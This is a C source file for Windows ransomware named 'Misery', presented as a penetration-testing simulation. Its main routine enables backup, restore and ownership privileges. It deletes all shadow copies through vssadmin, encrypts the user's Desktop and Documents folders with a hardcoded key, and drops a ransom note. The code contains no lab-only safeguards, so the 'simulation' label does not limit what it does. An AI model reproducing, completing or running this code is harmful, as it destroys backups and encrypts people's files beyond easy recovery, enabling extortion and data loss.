// misery.c - Complete ransomware simulation framework with evasion
// MinGW-w64 x86_64 compatible - SIMPLIFIED & STABLE
// Build: make

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "crypto.h"
#include "fileops.h"

// ===================== SIMPLE ENCRYPTION ENTRY =====================
void EncryptTargets() {
    char desktop_path[MAX_PATH];
    char docs_path[MAX_PATH];
    char downloads_path[MAX_PATH];
    
    printf("[*] Getting target paths...\n"); fflush(stdout);
    
    // Get standard Windows paths
    HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
    if (SUCCEEDED(hr)) {
        printf("[+] Desktop: %s\n", desktop_path); fflush(stdout);
    }
    
    hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs_path);
    if (SUCCEEDED(hr)) {
        printf("[+] Documents: %s\n", docs_path); fflush(stdout);
    }
    
    hr = SHGetFolderPathA(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, downloads_path);
    if (SUCCEEDED(hr)) {
        printf("[+] Downloads: %s\n", downloads_path); fflush(stdout);
    }
    
    printf("[*] Initializing file operations...\n"); fflush(stdout);
    if (!InitFileOps(4)) {
        printf("[ERROR] Failed to initialize file operations\n"); fflush(stdout);
        return;
    }
    printf("[+] File operations initialized\n"); fflush(stdout);
    
    printf("[*] Encrypting Desktop files...\n"); fflush(stdout);
    int encrypted = EncryptDirectory(desktop_path);
    printf("[+] Encrypted %d files from Desktop\n", encrypted); fflush(stdout);
    
    printf("[*] Encrypting Documents files...\n"); fflush(stdout);
    encrypted = EncryptDirectory(docs_path);
    printf("[+] Encrypted %d files from Documents\n", encrypted); fflush(stdout);
    
    printf("[*] Cleaning up file operations...\n"); fflush(stdout);
    CleanupFileOps();
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

// ===================== DELETE VSS SHADOW COPIES =====================
void DeleteVSS() {
    printf("[*] Attempting to delete VSS shadow copies...\n"); fflush(stdout);
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    // Simple VSS deletion via vssadmin
    if (CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
                       NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("[+] VSS deletion command executed\n"); fflush(stdout);
    }
}

// ===================== ELEVATE PRIVILEGES =====================
void ElevatePrivileges() {
    printf("[*] Attempting privilege escalation...\n"); fflush(stdout);
    
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] Failed to open process token\n"); fflush(stdout);
        return;
    }
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    const char* privs[] = {
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeTakeOwnershipPrivilege",
        NULL
    };
    
    for (int i = 0; privs[i]; i++) {
        if (LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    
    CloseHandle(hToken);
    printf("[+] Privileges escalated\n"); fflush(stdout);
}

// ===================== SET IO PRIORITY =====================
void SetIOPriorityHigh() {
    printf("[*] Setting IO priority...\n"); fflush(stdout);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    printf("[+] IO priority set to HIGH\n"); fflush(stdout);
}

// ===================== WRITE RANSOM NOTE =====================
void WriteRansomNote(const char* target_dir) {
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s\\MISERY_RANSOM.txt", target_dir);
    
    HANDLE hFile = CreateFileA(note_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        const char* note = "Your files have been encrypted.\n"
                          "This is a penetration testing simulation.\n"
                          "Contact: https://github.com/jahanzaibmir\n";
        DWORD written;
        WriteFile(hFile, note, (DWORD)strlen(note), &written, NULL);
        CloseHandle(hFile);
        printf("[+] Ransom note written to: %s\n", note_path); fflush(stdout);
    }
}

// ===================== MAIN =====================
int main() {
    printf("\n========== MISERY RANSOMWARE SIMULATOR ==========\n\n");
    fflush(stdout);
    
    printf("[*] Misery started\n"); fflush(stdout);
    
    printf("[*] Elevating privileges...\n"); fflush(stdout);
    ElevatePrivileges();
    
    printf("[*] Setting IO priority...\n"); fflush(stdout);
    SetIOPriorityHigh();
    
    printf("[*] Initializing crypto...\n"); fflush(stdout);
    CRYPTO_ERROR err = InitCrypto("Thejahanzaib@1318", 22);
    if (err != CRYPTO_SUCCESS) {
        printf("[ERROR] Crypto initialization failed: %s\n", GetErrorString(err));
        fflush(stdout);
        return 1;
    }
    printf("[+] Crypto initialized successfully\n"); fflush(stdout);
    
    printf("[*] Verifying crypto context...\n"); fflush(stdout);
    err = VerifyContext();
    if (err != CRYPTO_SUCCESS) {
        printf("[ERROR] Crypto context verification failed: %s\n", GetErrorString(err));
        fflush(stdout);
        CleanupCrypto();
        return 1;
    }
    printf("[+] Crypto context verified\n"); fflush(stdout);
    
    printf("[*] Deleting VSS shadow copies...\n"); fflush(stdout);
    DeleteVSS();
    
    printf("[*] Starting encryption phase...\n"); fflush(stdout);
    EncryptTargets();
    printf("[+] Encryption phase complete\n"); fflush(stdout);
    
    printf("[*] Writing ransom notes...\n"); fflush(stdout);
    char desktop_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path))) {
        WriteRansomNote(desktop_path);
    }
    
    printf("[*] Cleaning up...\n"); fflush(stdout);
    CleanupCrypto();
    
    printf("\n[+] MISERY execution complete\n");
    printf("================================================\n\n");
    fflush(stdout);
    
    return 0;
}
